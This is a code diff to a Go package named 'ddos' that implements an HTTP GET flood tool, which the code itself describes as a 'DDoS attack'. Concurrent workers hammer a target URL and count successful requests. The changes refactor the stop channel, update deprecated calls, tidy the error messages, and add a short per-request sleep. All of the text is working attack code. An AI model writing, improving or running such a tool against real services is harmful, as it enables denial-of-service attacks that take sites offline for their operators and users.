@@ -3,17 +3,16 @@ package ddos
 import (
 	"fmt"
 	"io"
-	"io/ioutil"
 	"net/http"
 	"net/url"
-	"runtime"
 	"sync/atomic"
+	"time"
 )
 
 // DDoS - structure of value for DDoS attack
 type DDoS struct {
 	url           string
-	stop          *chan bool
+	stop          chan struct{}
 	amountWorkers int
 
 	// Statistic
@@ -24,16 +23,15 @@ type DDoS struct {
 // New - initialization of new DDoS attack
 func New(URL string, workers int) (*DDoS, error) {
 	if workers < 1 {
-		return nil, fmt.Errorf("Amount of workers cannot be less 1")
+		return nil, fmt.Errorf("amount of workers cannot be less than 1")
 	}
 	u, err := url.Parse(URL)
 	if err != nil || len(u.Host) == 0 {
-		return nil, fmt.Errorf("Undefined host or error = %v", err)
+		return nil, fmt.Errorf("undefined host or error = %v", err)
 	}
-	s := make(chan bool)
 	return &DDoS{
 		url:           URL,
-		stop:          &s,
+		stop:          make(chan struct{}),
 		amountWorkers: workers,
 	}, nil
 }
@@ -44,19 +42,18 @@ func (d *DDoS) Run() {
 		go func() {
 			for {
 				select {
-				case <-(*d.stop):
+				case <-d.stop:
 					return
 				default:
-					// sent http GET requests
 					resp, err := http.Get(d.url)
 					atomic.AddInt64(&d.amountRequests, 1)
 					if err == nil {
 						atomic.AddInt64(&d.successRequest, 1)
-						_, _ = io.Copy(ioutil.Discard, resp.Body)
+						_, _ = io.Copy(io.Discard, resp.Body)
 						_ = resp.Body.Close()
 					}
+					time.Sleep(10 * time.Millisecond)
 				}
-				runtime.Gosched()
 			}
 		}()
 	}
@@ -64,10 +61,7 @@ func (d *DDoS) Run() {
 
 // Stop - stop DDoS attack
 func (d *DDoS) Stop() {
-	for i := 0; i < d.amountWorkers; i++ {
-		(*d.stop) <- true
-	}
-	close(*d.stop)
+	close(d.stop)
 }
 
 // Result - result of DDoS attack
